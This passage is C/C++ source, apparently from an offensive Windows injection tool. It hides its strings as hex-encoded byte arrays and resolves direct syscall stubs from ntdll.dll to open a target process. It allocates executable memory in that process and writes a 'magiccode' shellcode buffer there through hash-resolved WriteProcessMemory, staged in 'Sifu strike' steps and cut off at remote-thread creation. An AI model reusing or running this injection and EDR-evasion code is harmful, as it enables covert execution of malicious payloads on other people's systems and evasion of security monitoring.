	const char  mxt_9999Me_M_IrIGTQro1xRp57menu[] = {'\x5b','\x2b','\x5d','\x20','\x4d','\x65','\x6d','\x6f','\x72','\x79','\x20','\x6c','\x6f','\x63','\x61','\x74','\x69','\x6f','\x6e','\x20','\x6f','\x66','\x20','\x4e','\x74','\x4f','\x70','\x65','\x6e','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x20','\x73','\x79','\x73','\x63','\x61','\x6c','\x6c','\x20','\x73','\x74','\x75','\x62','\x20','\x6f','\x75','\x74','\x77','\x69','\x74','\x68','\x20','\x45','\x41','\x54','\x3a','\x20','\x25','\x70','\n',0};
	OutputDebugStringA("mxt_9999Me_M_IrIGTQro1xRp57menu");

	const char  mxt_9999Nt_R_0BMimbr2JOWE181enu[] = {'\x5b','\x2d','\x5d','\x20','\x4e','\x74','\x4f','\x70','\x65','\x6e','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x2e','\n',0};
	OutputDebugStringA("mxt_9999Nt_R_0BMimbr2JOWE181enu");

	const char  mxt_9999Nt_S_fmWbOVpX51DnU7Yenu[] = {'\x5b','\x2b','\x5d','\x20','\x4e','\x74','\x4f','\x70','\x65','\x6e','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x20','\x73','\x75','\x63','\x63','\x65','\x65','\x64','\x65','\x64','\x2e','\n',0};
	OutputDebugStringA("mxt_9999Nt_S_fmWbOVpX51DnU7Yenu");

	const char  mxt_9999Pr_M__peaKwDRqqsqEq5enu[] = {'\x5b','\x2b','\x5d','\x20','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x20','\x68','\x61','\x6e','\x64','\x6c','\x65','\x3a','\x20','\x25','\x49','\x58','\n',0};
	OutputDebugStringA("mxt_9999Pr_M__peaKwDRqqsqEq5enu");

	const char  mxt_9999Fa_M_Y7ChDZzPInHfoM0enu[] = {'\x5b','\x2d','\x5d','\x20','\x46','\x61','\x69','\x6c','\x65','\x64','\x20','\x74','\x6f','\x20','\x65','\x78','\x65','\x63','\x75','\x74','\x65','\x20','\x4e','\x74','\x4f','\x70','\x65','\x6e','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x2e','\n',0};
	OutputDebugStringA("mxt_9999Fa_M_Y7ChDZzPInHfoM0enu");

	const char  mxt_9999Me_M_3S70TrV3JXSgHoienu[] = {'\x5b','\x2b','\x5d','\x20','\x4d','\x65','\x6d','\x6f','\x72','\x79','\x20','\x6c','\x6f','\x63','\x61','\x74','\x69','\x6f','\x6e','\x20','\x6f','\x66','\x20','\x4e','\x74','\x4f','\x70','\x65','\x6e','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x20','\x73','\x79','\x73','\x63','\x61','\x6c','\x6c','\x20','\x73','\x74','\x75','\x62','\x3a','\x20','\x25','\x70','\n',0};
	OutputDebugStringA("mxt_9999Me_M_3S70TrV3JXSgHoienu");

	const char  mxt_9999ol_R_5DLBRqJbmqT86JGenu[] = {'\x5b','\x2a','\x5d','\x20','\x6f','\x6c','\x64','\x20','\x70','\x72','\x6f','\x74','\x65','\x63','\x74','\x69','\x6f','\x6e','\x3a','\x20','\x25','\x64','\n',0};
	OutputDebugStringA("mxt_9999ol_R_5DLBRqJbmqT86JGenu");

	const char  mxt_NtAllo_M_zgUv6Ns01ZJM9aTenu[] = {'\x4e','\x74','\x41','\x6c','\x6c','\x6f','\x63','\x61','\x74','\x65','\x56','\x69','\x72','\x74','\x75','\x61','\x6c','\x4d','\x65','\x6d','\x6f','\x72','\x79',0};
	OutputDebugStringA("mxt_NtAllo_M_zgUv6Ns01ZJM9aTenu");

	const char  mxt_9999Me_S_YStox1ywhXgirRuenu[] = {'\x5b','\x2b','\x5d','\x20','\x4d','\x65','\x6d','\x6f','\x72','\x79','\x20','\x6c','\x6f','\x63','\x61','\x74','\x69','\x6f','\x6e','\x20','\x6f','\x66','\x20','\x4e','\x74','\x41','\x6c','\x6c','\x6f','\x63','\x61','\x74','\x65','\x56','\x69','\x72','\x74','\x75','\x61','\x6c','\x4d','\x65','\x6d','\x6f','\x72','\x79','\x20','\x73','\x79','\x73','\x63','\x61','\x6c','\x6c','\x20','\x73','\x74','\x75','\x62','\x20','\x6f','\x75','\x74','\x77','\x69','\x74','\x68','\x20','\x45','\x41','\x54','\x3a','\x20','\x25','\x70','\n',0};
	OutputDebugStringA("mxt_9999Me_S_YStox1ywhXgirRuenu");

	const char  mxt_9999Nt_R_ugmFuuaAdEUC6Xhenu[] = {'\x5b','\x2d','\x5d','\x20','\x4e','\x74','\x41','\x6c','\x6c','\x6f','\x63','\x61','\x74','\x65','\x56','\x69','\x72','\x74','\x75','\x61','\x6c','\x4d','\x65','\x6d','\x6f','\x72','\x79','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x2e','\n',0};
	OutputDebugStringA("mxt_9999Nt_R_ugmFuuaAdEUC6Xhenu");

	const char  mxt_9999Nt_S_I4zP6a4n4oEDETpenu[] = {'\x5b','\x2b','\x5d','\x20','\x4e','\x74','\x41','\x6c','\x6c','\x6f','\x63','\x61','\x74','\x65','\x56','\x69','\x72','\x74','\x75','\x61','\x6c','\x4d','\x65','\x6d','\x6f','\x72','\x79','\x20','\x73','\x75','\x63','\x63','\x65','\x65','\x64','\x65','\x64','\x2e','\n',0};
	OutputDebugStringA("mxt_9999Nt_S_I4zP6a4n4oEDETpenu");

	const char  mxt_9999Pr_R__r0IMpUI6nZ4JGmenu[] = {'\x5b','\x2b','\x5d','\x20','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x20','\x68','\x61','\x6e','\x64','\x6c','\x65','\x3a','\x20','\x25','\x49','\x58','\n',0};
	OutputDebugStringA("mxt_9999Pr_R__r0IMpUI6nZ4JGmenu");

	const char  mxt_9999Fa_R_X9stdwv93oIFdUXenu[] = {'\x5b','\x2d','\x5d','\x20','\x46','\x61','\x69','\x6c','\x65','\x64','\x20','\x74','\x6f','\x20','\x65','\x78','\x65','\x63','\x75','\x74','\x65','\x20','\x4e','\x74','\x41','\x6c','\x6c','\x6f','\x63','\x61','\x74','\x65','\x56','\x69','\x72','\x74','\x75','\x61','\x6c','\x4d','\x65','\x6d','\x6f','\x72','\x79','\x2e','\n',0};
	OutputDebugStringA("mxt_9999Fa_R_X9stdwv93oIFdUXenu");

	const char  mxt_9999ol_S_rfSMj5CRw8G4vVIenu[] = {'\x5b','\x2a','\x5d','\x20','\x6f','\x6c','\x64','\x20','\x70','\x72','\x6f','\x74','\x65','\x63','\x74','\x69','\x6f','\x6e','\x3a','\x20','\x25','\x64','\n',0};
	OutputDebugStringA("mxt_9999ol_S_rfSMj5CRw8G4vVIenu");

	const char  mxt_9999AT_S_ZEvyncc8dbdG4odenu[] = {'\x5b','\x2a','\x5d','\x20','\x41','\x54','\x54','\x45','\x4e','\x54','\x49','\x4f','\x4e','\x3a','\x20','\x73','\x74','\x65','\x70','\x20','\x31','\x2c','\x20','\x53','\x69','\x66','\x75','\x20','\x77','\x69','\x6c','\x6c','\x20','\x73','\x74','\x72','\x69','\x6b','\x65','\x20','\x74','\x68','\x65','\x20','\x31','\x73','\x74','\x20','\x62','\x6c','\x6f','\x77','\x21','\x20','\n',0};
	OutputDebugStringA("mxt_9999AT_S_ZEvyncc8dbdG4odenu");

	const char  mxt_999999_S_0yDhkasMLU5fL9aenu[] = {'\x5b','\x2a','\x2a','\x2a','\x2a','\x2a','\x2a','\x5d','\x20','\x41','\x54','\x54','\x45','\x4e','\x54','\x49','\x4f','\x4e','\x3a','\x20','\x72','\x65','\x6d','\x6f','\x74','\x65','\x42','\x75','\x66','\x66','\x65','\x72','\x3a','\x20','\x30','\x78','\x25','\x70','\n',0};
	OutputDebugStringA("mxt_999999_S_0yDhkasMLU5fL9aenu");

	const char  mxt_999999_S_woWQCnjCxUbROGWenu[] = {'\x5b','\x2a','\x2a','\x2a','\x2a','\x2a','\x2a','\x5d','\x20','\x41','\x54','\x54','\x45','\x4e','\x54','\x49','\x4f','\x4e','\x3a','\x20','\x70','\x69','\x64','\x20','\x74','\x6f','\x20','\x73','\x74','\x72','\x69','\x6b','\x65','\x3a','\x20','\x25','\x64','\n',0};
	OutputDebugStringA("mxt_999999_S_woWQCnjCxUbROGWenu");

	const char  mxt_WriteP_R_U3LfO3R3rrmO9nGenu[] = {'\x57','\x72','\x69','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x4d','\x65','\x6d','\x6f','\x72','\x79',0};
	OutputDebugStringA("mxt_WriteP_R_U3LfO3R3rrmO9nGenu");

	const char  mxt_999Has_R_1vkSzAELxxZWK2cenu[] = {'\x5b','\x2a','\x5d','\x48','\x61','\x73','\x68','\x20','\x6f','\x66','\x20','\x57','\x72','\x69','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x4d','\x65','\x6d','\x6f','\x72','\x79','\x3a','\x20','\x30','\x78','\x25','\x6c','\x78','\n',0};
	OutputDebugStringA("mxt_999Has_R_1vkSzAELxxZWK2cenu");

	const char  mxt_kernel_M_xH8YDHWuKbYXzQWenu[] = {'\x6b','\x65','\x72','\x6e','\x65','\x6c','\x33','\x32','\x2e','\x64','\x6c','\x6c',0};
	OutputDebugStringA("mxt_kernel_M_xH8YDHWuKbYXzQWenu");

	const char  mxt_999Err_M_Uf4r0Gy2iED2zBUenu[] = {'\x5b','\x2d','\x5d','\x45','\x72','\x72','\x6f','\x72','\x20','\x77','\x72','\x69','\x74','\x69','\x6e','\x67','\x20','\x74','\x6f','\x20','\x70','\x72','\x6f','\x63','\x65','\x73','\x73','\x20','\x6d','\x65','\x6d','\x6f','\x72','\x79','\x2e','\n',0};
	OutputDebugStringA("mxt_999Err_M_Uf4r0Gy2iED2zBUenu");

	const char  mxt_999Suc_M_mM8TYSAVW_WqRkFenu[] = {'\x5b','\x2b','\x5d','\x53','\x75','\x63','\x63','\x65','\x73','\x73','\x66','\x75','\x6c','\x6c','\x79','\x20','\x77','\x72','\x6f','\x74','\x65','\x20','\x6d','\x61','\x67','\x69','\x63','\x63','\x6f','\x64','\x65','\x20','\x74','\x6f','\x20','\x74','\x68','\x65','\x20','\x61','\x6c','\x6c','\x6f','\x63','\x61','\x74','\x65','\x64','\x20','\x6d','\x65','\x6d','\x6f','\x72','\x79','\x2e','\n',0};
	OutputDebugStringA("mxt_999Suc_M_mM8TYSAVW_WqRkFenu");

	const char  mxt_9999AT_S__SLEbPwztJ5gpzrenu[] = {'\x5b','\x2a','\x5d','\x20','\x41','\x54','\x54','\x45','\x4e','\x54','\x49','\x4f','\x4e','\x3a','\x20','\x73','\x74','\x65','\x70','\x20','\x32','\x2c','\x20','\x53','\x69','\x66','\x75','\x20','\x77','\x69','\x6c','\x6c','\x20','\x73','\x74','\x72','\x69','\x6b','\x65','\x20','\x74','\x68','\x65','\x20','\x32','\x6e','\x64','\x20','\x62','\x6c','\x6f','\x77','\x21','\x20','\n',0};
	OutputDebugStringA("mxt_9999AT_S__SLEbPwztJ5gpzrenu");

	const char  mxt_999999_M_IVQaf7gy35HciaLenu[] = {'\x5b','\x2a','\x2a','\x2a','\x2a','\x2a','\x2a','\x5d','\x20','\x41','\x54','\x54','\x45','\x4e','\x54','\x49','\x4f','\x4e','\x3a','\x20','\x20','\x72','\x65','\x6d','\x6f','\x74','\x65','\x42','\x75','\x66','\x66','\x65','\x72','\x3a','\x20','\x30','\x78','\x25','\x70','\n',0};
	OutputDebugStringA("mxt_999999_M_IVQaf7gy35HciaLenu");

	const char  mxt_999999_R_io77abnsoqGRa0ienu[] = {'\x5b','\x2a','\x2a','\x2a','\x2a','\x2a','\x2a','\x5d','\x20','\x41','\x54','\x54','\x45','\x4e','\x54','\x49','\x4f','\x4e','\x3a','\x20','\x70','\x69','\x64','\x20','\x74','\x6f','\x20','\x73','\x74','\x72','\x69','\x6b','\x65','\x3a','\x20','\x25','\x64','\n',0};
	OutputDebugStringA("mxt_999999_R_io77abnsoqGRa0ienu");

	const char  mxt_9999AT_R_f_pw2izcYVckYZvenu[] = {'\x5b','\x2a','\x5d','\x20','\x41','\x54','\x54','\x45','\x4e','\x54','\x49','\x4f','\x4e','\x3a','\x20','\x73','\x74','\x65','\x70','\x20','\x33','\x2c','\x20','\x53','\x69','\x66','\x75','\x20','\x77','\x69','\x6c','\x6c','\x20','\x73','\x74','\x72','\x69','\x6b','\x65','\x20','\x74','\x68','\x65','\x20','\x33','\x72','\x64','\x20','\x62','\x6c','\x6f','\x77','\x21','\x20','\n',0};
	OutputDebugStringA("mxt_9999AT_R_f_pw2izcYVckYZvenu");

	const char  mxt_NtCrea_M_IIj3t2ah4H31Zyrenu[] = {'\x4e','\x74','\x43','\x72','\x65','\x61','\x74','\x65','\x54','\x68','\x72','\x65','\x61','\x64','\x45','\x78',0};
	OutputDebugStringA("mxt_NtCrea_M_IIj3t2ah4H31Zyrenu");

	const char  mxt_9999Me_S_qJdIsyWVLHB56IVenu[] = {'\x5b','\x2b','\x5d','\x20','\x4d','\x65','\x6d','\x6f','\x72','\x79','\x20','\x6c','\x6f','\x63','\x61','\x74','\x69','\x6f','\x6e','\x20','\x6f','\x66','\x20','\x4e','\x74','\x43','\x72','\x65','\x61','\x74','\x65','\x54','\x68','\x72','\x65','\x61','\x64','\x45','\x78','\x20','\x73','\x79','\x73','\x63','\x61','\x6c','\x6c','\x20','\x73','\x74','\x75','\x62','\x20','\x6f','\x75','\x74','\x77','\x69','\x74','\x68','\x20','\x45','\x41','\x54','\x3a','\x20','\x25','\x70','\n',0};
	OutputDebugStringA("mxt_9999Me_S_qJdIsyWVLHB56IVenu");

	const char  mxt_9999Nt_R_XQP4tcEPIuh3TSGenu[] = {'\x5b','\x2d','\x5d','\x20','\x4e','\x74','\x43','\x72','\x65','\x61','\x74','\x65','\x54','\x68','\x72','\x65','\x61','\x64','\x45','\x78','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x2e','\n',0};
	OutputDebugStringA("mxt_9999Nt_R_XQP4tcEPIuh3TSGenu");

	const char  mxt_9999Nt_S_u0YMWbaGTkZOVlKenu[] = {'\x5b','\x2b','\x5d','\x20','\x4e','\x74','\x43','\x72','\x65','\x61','\x74','\x65','\x54','\x68','\x72','\x65','\x61','\x64','\x45','\x78','\x20','\x73','\x75','\x63','\x63','\x65','\x65','\x64','\x65','\x64','\x2e','\n',0};
	OutputDebugStringA("mxt_9999Nt_S_u0YMWbaGTkZOVlKenu");

	const char  mxt_9999Pr_M_Re9rruS_eV_B4Ykenu[] = {'\x5b','\x2b','\x5d','\x20','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x20','\x68','\x61','\x6e','\x64','\x6c','\x65','\x3a','\x20','\x25','\x49','\x58','\n',0};
	OutputDebugStringA("mxt_9999Pr_M_Re9rruS_eV_B4Ykenu");

	const char  mxt_9999Fa_S_JRbmVpnJ3DX1dWLenu[] = {'\x5b','\x2d','\x5d','\x20','\x46','\x61','\x69','\x6c','\x65','\x64','\x20','\x74','\x6f','\x20','\x65','\x78','\x65','\x63','\x75','\x74','\x65','\x20','\x4e','\x74','\x43','\x72','\x65','\x61','\x74','\x65','\x54','\x68','\x72','\x65','\x61','\x64','\x45','\x78','\x2e','\n',0};
	OutputDebugStringA("mxt_9999Fa_S_JRbmVpnJ3DX1dWLenu");

	const char  mxt_NtClos_M_j8ttTYNX0gfFq6Eenu[] = {'\x4e','\x74','\x43','\x6c','\x6f','\x73','\x65',0};
	OutputDebugStringA("mxt_NtClos_M_j8ttTYNX0gfFq6Eenu");

	const char  mxt_9999Me_R_jMbA174m441g2jTenu[] = {'\x5b','\x2b','\x5d','\x20','\x4d','\x65','\x6d','\x6f','\x72','\x79','\x20','\x6c','\x6f','\x63','\x61','\x74','\x69','\x6f','\x6e','\x20','\x6f','\x66','\x20','\x4e','\x74','\x43','\x6c','\x6f','\x73','\x65','\x20','\x73','\x79','\x73','\x63','\x61','\x6c','\x6c','\x20','\x73','\x74','\x75','\x62','\x20','\x6f','\x75','\x74','\x77','\x69','\x74','\x68','\x20','\x45','\x41','\x54','\x3a','\x20','\x25','\x70','\n',0};
	OutputDebugStringA("mxt_9999Me_R_jMbA174m441g2jTenu");

	const char  mxt_9999Nt_M_r17pJCDNXB4YCKQenu[] = {'\x5b','\x2d','\x5d','\x20','\x4e','\x74','\x43','\x72','\x65','\x61','\x74','\x65','\x54','\x68','\x72','\x65','\x61','\x64','\x45','\x78','\x20','\x66','\x61','\x69','\x6c','\x65','\x64','\x2e','\n',0};
	OutputDebugStringA("mxt_9999Nt_M_r17pJCDNXB4YCKQenu");

	const char  mxt_9999Nt_S_c1zXzYLJT6sq2wAenu[] = {'\x5b','\x2b','\x5d','\x20','\x4e','\x74','\x43','\x6c','\x6f','\x73','\x65','\x20','\x73','\x75','\x63','\x63','\x65','\x65','\x64','\x65','\x64','\x2e','\n',0};
	OutputDebugStringA("mxt_9999Nt_S_c1zXzYLJT6sq2wAenu");

	const char  mxt_9999th_M_b1rTJqNUG8Cihr9enu[] = {'\x5b','\x2b','\x5d','\x20','\x74','\x68','\x72','\x65','\x61','\x64','\x20','\x68','\x61','\x6e','\x64','\x6c','\x65','\x3a','\x20','\x25','\x49','\x58','\n',0};
	OutputDebugStringA("mxt_9999th_M_b1rTJqNUG8Cihr9enu");

	const char  mxt_9999Fa_M_bww5Rpqn_yIu4n_enu[] = {'\x5b','\x2d','\x5d','\x20','\x46','\x61','\x69','\x6c','\x65','\x64','\x20','\x74','\x6f','\x20','\x65','\x78','\x65','\x63','\x75','\x74','\x65','\x20','\x4e','\x74','\x43','\x6c','\x6f','\x73','\x65','\x2e','\n',0};
	OutputDebugStringA("mxt_9999Fa_M_bww5Rpqn_yIu4n_enu");

	const char  mxt_9999Su_M_2Uk8RfcFx8jyd4aenu[] = {'\x5b','\x2b','\x5d','\x20','\x53','\x75','\x63','\x63','\x65','\x73','\x73','\x66','\x75','\x6c','\x21',0};
	OutputDebugStringA("mxt_9999Su_M_2Uk8RfcFx8jyd4aenu");
HMODULE hKernel32 = LoadLibraryA(mxt_kernel_M_rDMJrryPEIdpb07enu);
    if (!hKernel32) {
        printf(mxt_9999Fa_M_MnGO38d8k9J1cuPenu);
        return -1;
    }

    // Load ntdll.dll and retrieve its handle
    HMODULE hNtdll = LoadLibraryA(mxt_ntdll9_M_sLasFROcK04ZQ3nenu);
    if (!hNtdll) {
        printf(mxt_9999Fa_S_d5axICHXg5PaSgEenu);
        return -1;
    }

    PFN_GETLASTERROR pGetLastError = (PFN_GETLASTERROR)GetProcAddress(hKernel32, mxt_GetLas_M_WAL01TefMc0sPelenu);

    if (!EnableWindowsPrivilege(mxt_S9e9D9_R_XHCA7SqkAGvGoU4enu)) {
        printf(mxt_999Fai_R_8qtukBFZMLk9Rmhenu);
        return -1;
    }

    // Target process information:
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    DWORD pid = 0;
    char notepadPath[256] = {0};  // Initialize the buffer

    int step = -1; // Default value indicating 'step' is not set
    PVOID remoteBuffer = NULL; // Pointer to remoteBuffer
    BOOL pidProvided = FALSE, stepProvided = FALSE, bufferProvided = FALSE;



    // if (argc != 2) {
    //     printf("Usage: %s <PID>\n", argv[0], "running with default notepad");

    //     if (IsSystem64Bit()) {
    //         printf("[*] system is 64 bit\n");
    //         strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
    //     } else {
    //         printf("[*] system is 32 bit\n");
    //         strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
    //     }

    //     printf("[*] notepad path: %s\n", notepadPath); 

    //     BOOL success = CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    //     if (!success) {
    //         MessageBox(NULL, "[-]Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
    //         DWORD error = GetLastError();
    //         printf("[-]Failed to launch Notepad. Error: %d\n", error);
    //         return 1;
    //     }
    //     pid = pi.dwProcessId;
        
    // } else {
    //     printf("[*]PID provided: %s\n", argv[1]);
    //     pid = atoi(argv[1]);
    // }
////////////////////////////////////////////////////////
    // Parse command line arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-pid") == 0 && i + 1 < argc) {
            pid = atoi(argv[++i]);
            pidProvided = TRUE;
        } else if (strcmp(argv[i], "-step") == 0 && i + 1 < argc) {
            step = atoi(argv[++i]);
            if (step < 1 || step > 3) {
                printf(mxt_Invali_S_jbufc3mc7HcCUYhenu, step);
                step = -1; // Reset step to indicate invalid or not provided
            } else {
                stepProvided = TRUE;
            }
        } else if (strcmp(argv[i], mxt_9buffe_M_I6VRIyJ8PUmLtCRenu) == 0 && i + 1 < argc) {
            if (sscanf(argv[++i], "%p", &remoteBuffer) != 1) {
                printf(mxt_Invali_M_yF5wXH5qw_irymPenu);
                remoteBuffer = NULL; // Reset to NULL to indicate parsing failure
            } else {
                bufferProvided = TRUE;
            }
        }
    }

    // Validate command line arguments
    if (!pidProvided || !stepProvided || !bufferProvided) {
        // Default action or PID alone
        if (!pidProvided) {

            printf(mxt_Usage9_R_sTXITzQg_onkO6senu, argv[0]);
            printf(mxt_Runnin_M_CCdqkDjJh4N_Fxsenu);

            // Determine the correct Notepad path based on system architecture
            if (IsSystem64Bit()) {
                strcpy_s(notepadPath, sizeof(notepadPath), mxt_C99Win_S_2gkb_vCOJKqeBcaenu);
            } else {
                strcpy_s(notepadPath, sizeof(notepadPath), mxt_C99Win_S_XLPyLFmhk_1hEGhenu);
            }

            // Attempt to create a process with Notepad
            BOOL success = CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
            if (!success) {
                MessageBox(NULL, "Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
                return 1; // Exit if unable to start Notepad
            }
            printf(mxt_Notepa_M_LiZle1ddEqPRaJuenu);
            pid = pi.dwProcessId;

        } else {
            printf(mxt_PID9pr_R_YhBY7yy2jFtT513enu, pid);
            pid = atoi(argv[1]);
        }
    } else {
        // All required parameters are provided
        printf(mxt_PID999_R_AZXi58qWl7cDmnaenu, pid, step, remoteBuffer);
        // Proceed with the logic using PID, step, and buffer
    }

//////////////////////////////////////////





    Sleep(1000);
    printf(mxt_999tar_M_hGHiQoY0cUr5VXzenu, pid);

     // Get the handle to the default loaded ntdll.dll in the process
    HMODULE hNtdllDefault = GetModuleHandleA(mxt_ntdll9_M_t0lUaqemo8j_Wr8enu);
    if (hNtdllDefault == NULL) {
        printf(mxt_9999Fa_S_IMwtEZG6Xq7xcchenu);
        return -1;
    } else {
        printf(mxt_9999Me_M_tiG8SKrRWiCEdUaenu, hNtdllDefault);
    }

	char syscallStub[SYSCALL_STUB_SIZE] = {}; //need once, instead of having multiple locations we can reuse this stub for every function.
	SIZE_T bytesWritten = 0;
	DWORD oldProtection = 0; //need once. 
	HANDLE file = NULL;
	DWORD fileSize = 0;  
	DWORD bytesRead = 0;  
	LPVOID fileData = NULL;
	
	OBJECT_ATTRIBUTES oa;
	HANDLE fileHandle = NULL;
	NTSTATUS status = 0;  
	IO_STATUS_BLOCK osb;
	ZeroMemory(&osb, sizeof(IO_STATUS_BLOCK));

    // This part should be only called once to load the info of ntdll.dll. 
	file = CreateFileA(mxt_c99win_R_4JfseMvUYlFmPf6enu, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	fileSize = GetFileSize(file, NULL);
	fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
	ReadFile(file, fileData, fileSize, &bytesRead, NULL);
    printf(mxt_9999Me_S_nsCNYdRFOKjBTN3enu, fileData);


	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileData + dosHeader->e_lfanew);
	DWORD exportDirRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders);
	PIMAGE_SECTION_HEADER textSection = section;
	PIMAGE_SECTION_HEADER rdataSection = section;
    // This part should be only called once to load the info of ntdll.dll. 

    bool rdataSectionFound = false;

    for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++) 
    {
        if (strcmp((CHAR*)section->Name, (CHAR*)mxt_9rdata_M_u9gYijxyHeBHWXfenu) == 0) { 
            rdataSection = section;
            printf(mxt_99999r_S_rrb00M7iRGRq457enu);
            rdataSectionFound = true;
            break;
        }
        section++;
    }

    if (!rdataSectionFound) {
        printf(mxt_99999r_S_7yJ2lF9mIqhfALnenu);
    }

	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + exportDirRVA, rdataSection);

    ///*********************************************************************************
    // open process:

    myNtOpenProcess NtOpenProcess = (myNtOpenProcess)(LPVOID)syscallStub;
    VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
    // Open the target process
    HANDLE processHandle;
    CLIENT_ID clientId = { reinterpret_cast<HANDLE>(pid), nullptr };
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, nullptr, 0, nullptr, nullptr);

	if (GetSyscallStub(mxt_NtOpen_S_3Fhp5RgZYpZcDWHenu, exportDirectory, fileData, textSection, rdataSection, syscallStub)) {
        printf(mxt_9999Me_M_IrIGTQro1xRp57menu, (void*)NtOpenProcess);

        NTSTATUS status = NtOpenProcess(&processHandle, PROCESS_ALL_ACCESS, &objAttr, &clientId);
        if (status != STATUS_SUCCESS) {
            printf(mxt_9999Nt_R_0BMimbr2JOWE181enu);
            return -1;
        }
        printf(mxt_9999Nt_S_fmWbOVpX51DnU7Yenu);
        /// In 3 fingers death punch, the process handle will vary signifies the different process to strike. 
        printf(mxt_9999Pr_M__peaKwDRqqsqEq5enu, (SIZE_T)processHandle);
    } else {
        printf(mxt_9999Fa_M_Y7ChDZzPInHfoM0enu);
    }
    // Change the protection of the syscall stub back to its original protection
    VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, oldProtection, &oldProtection);
    printf(mxt_9999Me_M_3S70TrV3JXSgHoienu, (void*)NtOpenProcess);
    printf(mxt_9999ol_R_5DLBRqJbmqT86JGenu, oldProtection);
    
    
    
    ///*********************************************************************************
    if (step == -1 || step == 1) {

        // virtual allocate:
        myNtAllocateVirtualMemory NtVirtualAlloc = (myNtAllocateVirtualMemory)(LPVOID)syscallStub;
        VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

        // arguments needed for NtAllocateVirtualMemory
        // PVOID remoteBuffer = nullptr;
        SIZE_T magiccodeSize = sizeof(magiccode);

        if (GetSyscallStub(mxt_NtAllo_M_zgUv6Ns01ZJM9aTenu, exportDirectory, fileData, textSection, rdataSection, syscallStub)) {
            printf(mxt_9999Me_S_YStox1ywhXgirRuenu, (void*)NtVirtualAlloc);

            status = NtVirtualAlloc(processHandle, &remoteBuffer, 0, &magiccodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (status != STATUS_SUCCESS) {
                printf(mxt_9999Nt_R_ugmFuuaAdEUC6Xhenu);
                return -1;
            }
            printf(mxt_9999Nt_S_I4zP6a4n4oEDETpenu);
            printf(mxt_9999Pr_R__r0IMpUI6nZ4JGmenu, (SIZE_T)processHandle);
        } else {
            printf(mxt_9999Fa_R_X9stdwv93oIFdUXenu);
        }

        // Change the protection of the syscall stub back to its original protection
        VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, oldProtection, &oldProtection);
        printf(mxt_9999ol_S_rfSMj5CRw8G4vVIenu, oldProtection);
        if(step == 1) {
            printf(mxt_9999AT_S_ZEvyncc8dbdG4odenu);
            printf(mxt_999999_S_0yDhkasMLU5fL9aenu, remoteBuffer);
            printf(mxt_999999_S_woWQCnjCxUbROGWenu, pid);
        }


    }
    ///*********************************************************************************

    /// this step can also be devided from the previous calls.
    // virtual memory write:
    if (step == -1 || step == 2) {

        DWORD hashWriteProcessMemory = getHashFromString(mxt_WriteP_R_U3LfO3R3rrmO9nGenu);
        printf(mxt_999Has_R_1vkSzAELxxZWK2cenu, hashWriteProcessMemory);

        customWriteProcessMemory WriteProcessMemory = (customWriteProcessMemory)getFunctionAddressByHash((char *)mxt_kernel_M_xH8YDHWuKbYXzQWenu, hashWriteProcessMemory);

        ULONG bytesWrittens = 0;
        // Write the magiccode to the allocated memory
        if (!WriteProcessMemory(processHandle, remoteBuffer, magiccode, sizeof(magiccode), NULL))
        {
            printf(mxt_999Err_M_Uf4r0Gy2iED2zBUenu);
            VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
            CloseHandle(processHandle);
            return -1;
        } else {
            printf(mxt_999Suc_M_mM8TYSAVW_WqRkFenu);
            if(step == 2) {
                printf(mxt_9999AT_S__SLEbPwztJ5gpzrenu);
                printf(mxt_999999_M_IVQaf7gy35HciaLenu, remoteBuffer);
                printf(mxt_999999_R_io77abnsoqGRa0ienu, pid);
            }   
        }
    }

    ///*********************************************************************************
    ///// As a proof-of-concept, we can run the create remote thread from a seperate process
    /// from the other API functions called to get the addresses of remoteBuffer
    /// as remoteBuffer is the only argument that is needed for NtCreateThreadEx from previous API calls.
    /// We also need to get a new process handle. 
    // create remote thread:
    // Additional function for step == 3
    // if (step == 3) {
    //     // Open the process with the PID passed by the command line argument
